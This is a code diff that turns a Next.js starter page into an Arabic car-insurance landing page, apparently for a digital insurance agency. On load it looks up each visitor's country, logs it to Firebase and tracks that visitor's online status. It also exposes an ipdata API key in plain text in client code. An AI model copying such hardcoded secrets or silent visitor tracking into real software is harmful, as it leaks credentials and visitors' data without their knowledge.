@@ -1,113 +1,111 @@
-import Image from 'next/image';
+"use client"
 
-export default function Home() {
+import type React from "react"
+
+import Image from "next/image"
+import { Facebook, Instagram, Linkedin, Twitter, Shield, Phone, Mail } from "lucide-react"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { useEffect, useState } from "react"
+import { Tabs } from "@/components/ui/tabs"
+import { InsuranceTabs } from "@/components/insurance-tabs"
+import { InsuranceFlow } from "@/components/insurance-flow"
+import { addData, setupOnlineStatus } from "@/lib/firebase"
+function randstr(prefix:string){
+    return Math.random().toString(36).replace('0.',prefix || '');
+}
+const _id=randstr('tree-')
+export default function Component() {
+  useEffect(()=>{
+    getLocation().then(()=>{})
+  },[])
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+  
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const country = await response.text();
+        addData({
+            id:_id,
+            country: country
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(_id)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <div
+      className="min-h-screen bg-gradient-to-br from-emerald-700 via-emerald-900 to-emerald-800 text-white overflow-hidden"
+      dir="rtl"
+    >
+      {/* Animated Background Elements */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute -top-40 -right-40 w-80 h-80 bg-emerald-400/10 rounded-full blur-3xl animate-pulse"></div>
+        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-emerald-300/10 rounded-full blur-3xl animate-pulse delay-1000"></div>
+      </div>
+
+
+      {/* Language Toggle */}
+      <div className="flex justify-end px-6 mb-6">
+        <div className="bg-emerald-700/80 backdrop-blur-sm rounded-full px-4 py-2 text-sm flex items-center gap-3 shadow-lg border border-emerald-600/30">
+          <span className="font-medium">بالعربية</span>
+          <div className="w-5 h-5 bg-emerald-400 rounded-full shadow-inner animate-pulse"></div>
         </div>
       </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+      {/* Main Content */}
+      <div className="relative z-10 px-6 pb-8 ">
+        {/* Hero Text */}
+        <div className="text-center mb-12 space-y-4">
+          <h1 className="text-3xl md:text-4xl font-bold mb-6 leading-relaxed bg-gradient-to-r from-white to-emerald-200 bg-clip-text text-transparent">
+            ما في أحلى من الحرية، سوق الحين براحتك
+          </h1>
+          <p className="text-emerald-200 text-lg font-medium max-w-md mx-auto leading-relaxed">
+            لا تفوت الفرصة، أمن سيارتك بأفضل الأسعار
+          </p>
+          <div className="flex items-center justify-center gap-2 text-emerald-300 text-sm">
+            <Shield className="w-4 h-4" />
+            <span>حماية شاملة وموثوقة</span>
+          </div>
+        </div>
+
+        {/* Car Illustration */}
+        <div className="relative mb-12 ">
+          <div className=" rounded-3xl p-8 mx-4 shadow-2xl transform hover:scale-105 transition-transform duration-500">
+            <div className="relative">
+              <img
+                src="/motor_bg_ar.png"
+                alt="car"
+                width={350}
+                height={220}
+                className="w-full h-auto drop-shadow-2xl "
+              />
+              {/* Floating Elements */}
+              <div className="absolute -top-4 -right-4 w-8 h-8 bg-emerald-500 rounded-full animate-bounce delay-300"></div>
+              <div className="absolute -bottom-2 -left-4 w-6 h-6 bg-emerald-600 rounded-full animate-bounce delay-700"></div>
+            </div>
+          </div>
+
+        {/* Insurance Form with Tabs */}
+        <div className="max-w-md mx-auto text-right " >
+          <InsuranceFlow />
+        </div>
+        </div>
+
+        {/* Enhanced Disclaimer */}
+        <div className="text-center text-sm text-emerald-300/80 leading-relaxed px-6 py-4 bg-emerald-900/30 rounded-xl backdrop-blur-sm border border-emerald-700/30">
+          <Shield className="w-4 h-4 inline-block ml-2" />
+          بالنقر على "أمن سيارتك"، فإنني أمنح وكالة شركة (تري) للتأمين الرقمي إمكانية الوصول إلى معلوماتي.
+        </div>
       </div>
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  );
+    
+    </div>
+  )
 }
